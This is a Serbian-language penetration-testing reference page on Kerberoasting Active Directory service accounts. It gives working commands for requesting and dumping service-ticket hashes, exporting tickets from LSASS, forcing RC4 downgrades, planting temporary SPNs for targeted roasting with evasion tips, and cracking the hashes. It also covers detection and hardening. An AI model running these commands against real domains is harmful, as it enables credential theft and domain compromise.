# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoast se fokusira na pribavljanje TGS ticket-a, konkretno onih koji se odnose na servise koji rade pod user nalozima u Active Directory (AD), izuzimajući computer naloge. Enkripcija ovih ticket-a koristi ključeve izvedene iz user password-a, što omogućava offline credential cracking. Korišćenje user naloga kao servisa označava se nepraznim ServicePrincipalName (SPN) property-jem.

Bilo koji autentifikovani domain user može da zatraži TGS ticket-e, tako da nisu potrebne posebne privilegije.<sup>[[4]](#references)[[5]](#references)</sup>

### Ključne tačke

- Cilja TGS ticket-e za servise koji rade pod user nalozima (tj. nalozima sa podešenim SPN-om; ne computer nalozima).
- Ticket-i su enkriptovani ključem izvedenim iz password-a service account-a i mogu se crack-ovati offline.
- Nisu potrebne povišene privilegije; bilo koji autentifikovani nalog može da zatraži TGS ticket-e.

> [!WARNING]
> Većina javno dostupnih alata preferira zahtev za RC4-HMAC (etype 23) service ticket-ima, jer se crack-uju brže od AES-a. RC4 TGS hash-evi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnoga okruženja prelaze na AES-only. Nemojte pretpostaviti da je samo RC4 relevantan.
> Takođe, izbegavajte “spray-and-pray” roasting. Rubeus-ov podrazumevani kerberoast može da upita i zatraži ticket-e za sve SPN-ove i pritom generiše mnogo buke. Najpre enumerišite i ciljajte zanimljive principale.

### Tajne service account-a i cena Kerberos kriptografije

Mnogi servisi i dalje rade pod user nalozima sa ručno upravljanim password-ima. KDC enkriptuje service ticket-e ključevima izvedenim iz tih password-a i prosleđuje ciphertext bilo kom autentifikovanom principal-u, tako da kerberoasting omogućava neograničene offline pokušaje bez lockout-a ili telemetrije sa DC-a. Režim enkripcije određuje cracking budžet:

| Režim | Izvođenje ključa | Tip enkripcije | Približna RTX 5090 propusnost* | Napomene |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 sa 4.096 iteracija i per-principal salt-om generisanim iz domena + SPN-a | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 miliona pokušaja/s | Salt onemogućava rainbow tables, ali i dalje omogućava brzo crack-ovanje kratkih password-a. |
| RC4 + NT hash | Jedan MD4 password-a (unsalted NT hash); Kerberos dodaje samo 8-bajtni confounder po ticket-u | etype 23 (`$krb5tgs$23$`) | ~4,18 **milijardi** pokušaja/s | ~1000× brže od AES-a; attacker-i forsiraju RC4 kad god `msDS-SupportedEncryptionTypes` to dozvoljava. |

*Benchmark-i autora Chick3nman, navedeni u [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4 confounder samo randomizuje keystream; ne dodaje dodatni rad po pokušaju. Osim ako se service account-i ne oslanjaju na random secrets (gMSA/dMSA, machine account-i ili stringovi kojima se upravlja kroz vault), brzina kompromitovanja zavisi isključivo od GPU budžeta. Nametanje AES-only etype-ova uklanja downgrade od milijardu pokušaja u sekundi, ali slabi human password-i i dalje padaju na PBKDF2.<sup>[[3]](#references)</sup>

### Napad

#### Linux

Praktičan end-to-end primer koji koristi NetExec za zahtev roastable ticket-a i Hashcat za njihovo crack-ovanje dostupan je u referenci [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Alati sa više funkcionalnosti koji uključuju kerberoast provere:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Izlistajte kerberoastable korisnike
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Zatraži TGS i dumpuj iz memorije
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tehnika 2: Automatski alati
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS zahtev generiše Windows Security Event 4769 (Kerberos service ticket je zatražen).

### OPSEC i okruženja koja koriste samo AES

- Namerno zahtevajte RC4 za naloge bez AES:
- Rubeus: `/rc4opsec` koristi tgtdeleg za nabrajanje naloga bez AES-a i zahteva RC4 service tickets.
- Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve gde je to moguće.<sup>[[6]](#references)</sup>
- Roast-ujte naloge koji koriste samo AES umesto da nečujno ne uspe:
- Rubeus: `/aes` nabraja naloge sa omogućenim AES-om i zahteva AES service tickets (etype 17/18).
- Ako već posedujete TGT (PTT ili iz `.kirbi` datoteke), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Ciljanje, ograničavanje učestalosti i manje buke:
- Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtrirajte naloge sa verovatno slabim lozinkama koristeći `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili ciljajte privilegovane OU-ove pomoću `/ou:<DN>`.<sup>[[8]](#references)</sup>

Primeri (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Perzistencija / Zloupotreba

Ako kontrolišete nalog ili možete da ga izmenite, možete ga učiniti kerberoastable dodavanjem SPN-a:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Vratite nalog na stariju verziju da biste omogućili RC4 radi lakšeg crackinga (zahteva privilegije upisivanja nad ciljnim objektom):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast putem GenericWrite/GenericAll nad korisnikom (privremeni SPN)

Kada BloodHound prikaže da imate kontrolu nad objektom korisnika (npr. GenericWrite/GenericAll), možete pouzdano „targeted-roast“ tog konkretnog korisnika čak i ako trenutno nema nijedan SPN:<sup>[[9]](#references)</sup>

- Dodajte privremeni SPN kontrolisanom korisniku kako bi bio roastable.
- Zatražite TGS-REP šifrovan pomoću RC4 (etype 23) za taj SPN kako biste favorizovali cracking.
- Crackujte `$krb5tgs$23$...` hash pomoću hashcat-a.
- Uklonite SPN nakon toga kako biste smanjili footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatizuje dodavanje SPN-a -> zahtevanje TGS-a (etype 23) -> uklanjanje SPN-a):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crackujte izlaz pomoću hashcat autodetect (režim 13100 za `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Napomene za detekciju: dodavanje/uklanjanje SPN-ova proizvodi promene u direktorijumu (Event ID 5136/4738 na ciljnom korisniku), a TGS zahtev generiše Event ID 4769. Razmotrite ograničavanje učestalosti zahteva i čišćenje nakon izvršavanja.

Korisne alate za kerberoast napade možete pronaći ovde: https://github.com/nidem/kerberoast

Ako na Linuxu dobijete ovu grešku: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, uzrok je vremensko odstupanje lokalnog sistema. Sinhronizujte vreme sa DC-jem:

- `ntpdate <DC_IP>` (zastarelo na nekim distribucijama)
- `rdate -n <DC_IP>`

### Kerberoast bez domain naloga (AS-requested STs)

U septembru 2022. godine, Charlie Clark je pokazao da, ako principal ne zahteva pre-autentikaciju, moguće je dobiti service ticket putem konstruisanog KRB_AS_REQ zahteva, izmenom sname vrednosti u telu zahteva, čime se efektivno dobija service ticket umesto TGT-a. Ovo je analogno AS-REP roastingu i ne zahteva važeće domain akreditive.

Detalji su dostupni u Semperis tekstu „New Attack Paths: AS-requested STs“.<sup>[[10]](#references)</sup>

> [!WARNING]
> Morate navesti listu korisnika jer bez važećih akreditiva ne možete upititi LDAP ovom tehnikom.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Povezano

Ako ciljate AS-REP roastable korisnike, pogledajte i:

{{#ref}}
asreproast.md
{{#endref}}

### Detekcija

Kerberoasting može biti stealthy. Pratite Event ID 4769 sa DC-ova i primenite filtere kako biste smanjili šum:

- Isključite naziv servisa `krbtgt` i nazive servisa koji se završavaju sa `$` (računari).
- Isključite zahteve sa machine naloga (`*$$@*`).
- Samo uspešni zahtevi (Failure Code `0x0`).
- Pratite tipove enkripcije: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne generišite upozorenja samo za `0x17`.

Primer PowerShell triage-a:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatne ideje:

- Uspostavite osnovnu normalnu upotrebu SPN-ova po hostu/korisniku; generišite upozorenje za velike nalete različitih SPN zahteva sa jednog principal-a.
- Označite neuobičajenu upotrebu RC4 u domenima ojačanim AES-om.

### Ublažavanje / Ojačavanje

- Koristite gMSA/dMSA ili machine accounts za servise. Managed accounts imaju nasumične lozinke duže od 120 karaktera i automatski ih rotiraju, čime offline cracking postaje nepraktičan.<sup>[[7]](#references)</sup>
- Nametnite AES za service accounts postavljanjem `msDS-SupportedEncryptionTypes` na AES-only (decimalno 24 / heksadecimalno 0x18), a zatim rotirajte lozinku kako bi se AES ključevi ponovo izveli.<sup>[[7]](#references)</sup>
- Gde je moguće, onemogućite RC4 u svom okruženju i nadgledajte pokušaje upotrebe RC4. Na DC-ovima možete koristiti registry vrednost `DefaultDomainSupportedEncTypes` kako biste usmerili podrazumevane vrednosti za accounts kod kojih `msDS-SupportedEncryptionTypes` nije postavljen. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove sa user accounts.<sup>[[7]](#references)</sup>
- Koristite duge, nasumične lozinke za service accounts (25+ karaktera) ako managed accounts nisu izvodljivi; zabranite uobičajene lozinke i redovno vršite audit.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking u praksi](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Napadi niskotehnološkim metodama i velikim uticajem zasnovani na zastareloj Kerberos kriptografiji (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Zloupotreba Active Directory Kerberos-a: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Zahtevanje TGS-a šifrovanog pomoću RC4 kada je AES omogućen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft-ove smernice za ublažavanje Kerberoasting-a](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Dokumentacija komande Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL akreditivi → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Novi putevi napada? AS Requested Service Tickets (Charlie Clark, septembar 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
